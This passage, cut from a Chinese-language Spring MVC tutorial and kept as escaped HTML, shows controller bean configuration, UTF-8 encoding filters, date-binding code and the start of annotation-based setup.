class=&quot;hljs-title&quot;&gt;Controller&lt;/span&gt; &lt;/span&gt;{&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; ModelAndView &lt;span class=&quot;hljs-title&quot;&gt;handleRequest&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(HttpServletRequest request, HttpServletResponse response)&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;throws&lt;/span&gt; Exception &lt;/span&gt;{&lt;br/&gt;ModelAndView mv = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; ModelAndView();&lt;br/&gt;mv.setViewName(&lt;span class=&quot;hljs-string&quot;&gt;&quot;add&quot;&lt;/span&gt;);&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; mv;&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;（6）在springmvc.xml中配置bean&lt;/p&gt;
&lt;pre readability=&quot;4&quot;&gt;
&lt;code class=&quot;hljs xml&quot; readability=&quot;2&quot;&gt;    &lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;/command.do&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;com.itheima.controller.CommandController&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;p&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;/toAdd.do&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;com.itheima.controller.ToAddController&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;h73&quot;&gt;&lt;span&gt;&lt;strong&gt;7.3、中文乱码解决&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;（1）解决get请求乱码&lt;/strong&gt;&lt;br/&gt;  配置tomcat的编码，如下图所示：&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/10/26/5Xb0JX.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;&lt;strong&gt;（2）解决post请求乱码&lt;/strong&gt;&lt;br/&gt;  在web.xml中，配置spring编码过滤器，如下所示：
&lt;pre&gt;
&lt;code class=&quot;hljs xml&quot;&gt;    &lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;filter&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;filter-name&lt;/span&gt;&amp;gt;&lt;/span&gt;characterEcoding&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;filter-name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;filter-class&lt;/span&gt;&amp;gt;&lt;/span&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;filter-class&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;init-param&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;param-name&lt;/span&gt;&amp;gt;&lt;/span&gt;encoding&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;param-name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;param-value&lt;/span&gt;&amp;gt;&lt;/span&gt;UTF-8&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;param-value&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;init-param&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;filter&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;filter-mapping&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;filter-name&lt;/span&gt;&amp;gt;&lt;/span&gt;characterEcoding&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;filter-name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;url-pattern&lt;/span&gt;&amp;gt;&lt;/span&gt;/*&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;url-pattern&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;filter-mapping&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;h74&quot;&gt;&lt;span&gt;&lt;strong&gt;7.4、时间类型转换&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;  在CommandController类中重写initBinder()方法，示例代码如下：&lt;/p&gt;
&lt;pre readability=&quot;14&quot;&gt;
&lt;code class=&quot;hljs java&quot; readability=&quot;22&quot;&gt;&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@SuppressWarnings&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;&quot;deprecation&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;CommandController&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;AbstractCommandController&lt;/span&gt; &lt;/span&gt;{&lt;p&gt;&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;CommandController&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.setCommandClass(User.class);&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;protected&lt;/span&gt; ModelAndView &lt;span class=&quot;hljs-title&quot;&gt;handle&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(HttpServletRequest request, HttpServletResponse response, Object command, BindException errors)&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;throws&lt;/span&gt; Exception &lt;/span&gt;{&lt;br/&gt;&lt;/p&gt;&lt;p&gt;&lt;br/&gt;User user = (User) command;&lt;br/&gt;ModelAndView mv = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; ModelAndView();&lt;br/&gt;mv.addObject(&lt;span class=&quot;hljs-string&quot;&gt;&quot;user&quot;&lt;/span&gt;, user);&lt;br/&gt;mv.setViewName(&lt;span class=&quot;hljs-string&quot;&gt;&quot;index&quot;&lt;/span&gt;);&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; mv;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;initBinder&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(HttpServletRequest request, ServletRequestDataBinder binder)&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;throws&lt;/span&gt; Exception &lt;/span&gt;{&lt;br/&gt;String str = request.getParameter(&lt;span class=&quot;hljs-string&quot;&gt;&quot;birthday&quot;&lt;/span&gt;);&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (str.contains(&lt;span class=&quot;hljs-string&quot;&gt;&quot;/&quot;&lt;/span&gt;)) {&lt;br/&gt;binder.registerCustomEditor(Date.class, &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; CustomDateEditor(&lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; SimpleDateFormat(&lt;span class=&quot;hljs-string&quot;&gt;&quot;yyyy/MM/dd&quot;&lt;/span&gt;), &lt;span class=&quot;hljs-keyword&quot;&gt;true&lt;/span&gt;));&lt;br/&gt;} &lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt; {&lt;br/&gt;binder.registerCustomEditor(Date.class, &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; CustomDateEditor(&lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; SimpleDateFormat(&lt;span class=&quot;hljs-string&quot;&gt;&quot;yyyy-MM-dd&quot;&lt;/span&gt;), &lt;span class=&quot;hljs-keyword&quot;&gt;true&lt;/span&gt;));&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;h75parameterizableviewcontroller&quot;&gt;&lt;span&gt;&lt;strong&gt;7.5、参数控制器ParameterizableViewController&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;  在springmvc.xml中配置参数控制器&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/10/26/5XbzSi.png&quot; alt=&quot;&quot;/&gt;&lt;ul&gt;&lt;li&gt;&lt;span&gt;注意：使用参数控制器：不用自己定义Controller了，可以直接使用toIndex.do进行访问。&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;h8&quot;&gt;&lt;span&gt;&lt;strong&gt;8、注解开发&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;h3 id=&quot;h81&quot;&gt;&lt;span&gt;&lt;strong&gt;8.1、注解开发第一个入门程序&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;步骤如下：
&lt;ul&gt;&lt;li&gt;&lt;span&gt;创建一个动态的web工程，导入jar文件&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;配置web.xml&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;配置springmvc.xml文件：配置处理器映射器、配置处理器适配器、配置视图解析器&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;自定义Controller类，使用注解开发：添加，返回到成功页面进行回显，点击修改回到添加页面，初步理解参数传递。&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;（1）创建一个动态的web工程，导入jar文件&lt;/strong&gt;&lt;br/&gt;  详细过程同&lt;code&gt;3、springmvc第一个程序案例&lt;/code&gt;&lt;br/&gt;&lt;strong&gt;（2）配置web.xml&lt;/strong&gt;&lt;/p&gt;
&lt;pre readability=&quot;7.5&quot;&gt;
&lt;code class=&quot;hljs xml&quot; readability=&quot;9&quot;&gt;&lt;span class=&quot;hljs-meta&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;web-app&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;xmlns:xsi&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;xmlns&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://java.sun.com/xml/ns/javaee&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;xsi:schemaLocation&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;WebApp_ID&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;version&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;2.5&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;display-name&lt;/span&gt;&amp;gt;&lt;/span&gt;day63_SpringMVC_01&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;display-name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;filter&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;filter-name&lt;/span&gt;&amp;gt;&lt;/span&gt;characterEcoding&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;filter-name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;filter-class&lt;/span&gt;&amp;gt;&lt;/span&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;filter-class&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;init-param&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;param-name&lt;/span&gt;&amp;gt;&lt;/span&gt;encoding&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;param-name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;param-value&lt;/span&gt;&amp;gt;&lt;/span&gt;UTF-8&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;param-value&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;init-param&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;filter&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;filter-mapping&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;filter-name&lt;/span&gt;&amp;gt;&lt;/span&gt;characterEcoding&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;filter-name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;url-pattern&lt;/span&gt;&amp;gt;&lt;/span&gt;/*&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;url-pattern&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;filter-mapping&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;p&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;servlet&lt;/span&gt; &amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;servlet-name&lt;/span&gt;&amp;gt;&lt;/span&gt;springmvc&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;servlet-name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;servlet-class&lt;/span&gt;&amp;gt;&lt;/span&gt;org.springframework.web.servlet.DispatcherServlet&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;servlet-class&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;init-param&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;param-name&lt;/span&gt;&amp;gt;&lt;/span&gt;contextConfigLocation&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;param-name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;param-value&lt;/span&gt;&amp;gt;&lt;/span&gt;classpath:springmvc.xml&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;param-value&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;init-param&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;servlet&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;servlet-mapping&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;servlet-name&lt;/span&gt;&amp;gt;&lt;/span&gt;springmvc&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;servlet-name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;url-pattern&lt;/span&gt;&amp;gt;&lt;/span&gt;*.do&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;url-pattern&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;servlet-mapping&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;welcome-file-list&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;welcome-file&lt;/span&gt;&amp;gt;&lt;/span&gt;index.html&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;welcome-file&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;welcome-file&lt;/span&gt;&amp;gt;&lt;/span&gt;index.htm&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;welcome-file&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;welcome-file&lt;/span&gt;&amp;gt;&lt;/span&gt;index.jsp&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;welcome-file&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;welcome-file&lt;/span&gt;&amp;gt;&lt;/span&gt;default.html&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;welcome-file&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;welcome-file&lt;/span&gt;&amp;gt;&lt;/span&gt;default.htm&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;welcome-file&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;welcome-file&lt;/span&gt;&amp;gt;&lt;/span&gt;default.jsp&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;welcome-file&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;welcome-file-list&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;web-app&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;（3）配置springmvc.xml文件&lt;/strong&gt;&lt;br/&gt;  配置扫描，把Controller交给spring管理、配置处理器映射器、配置处理器适配器、配置视图解析器&lt;/p&gt;
&lt;pre readability=&quot;8&quot;&gt;
&lt;code class=&quot;hljs xml&quot; readability=&quot;10&quot;&gt;&lt;span class=&quot;hljs-meta&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;beans&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;xmlns&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.springframework.org/schema/beans&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;xmlns:xsi&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&lt;/span&gt; &lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;xmlns:mvc&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.springframework.org/schema/mvc&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;xmlns:context&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.springframework.org/schema/context&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;xmlns:aop&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.springframework.org/schema/aop&quot;&lt;/span&gt; &lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;xmlns:tx&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.springframework.org/schema/tx&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;xsi:schemaLocation&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.springframework.org/schema/beans &lt;br/&gt;http://www.springframework.org/schema/beans/spring-beans-3.2.xsd &lt;br/&gt;http://www.springframework.org/schema/mvc &lt;br/&gt;http://www.springframework.org/schema/mvc/spring-mvc-3.2.xsd &lt;br/&gt;http://www.springframework.org/schema/context &lt;br/&gt;http://www.springframework.org/schema/context/spring-context-3.2.xsd &lt;br/&gt;http://www.springframework.org/schema/aop &lt;br/&gt;http://www.springframework.org/schema/aop/spring-aop-3.2.xsd &lt;br/&gt;http://www.springframework.org/schema/tx &lt;br/&gt;http://www.springframework.org/schema/tx/spring-tx-3.2.xsd &quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;context:component-scan&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;base-package&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;com.itheima&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;context:component-scan&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;p&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span 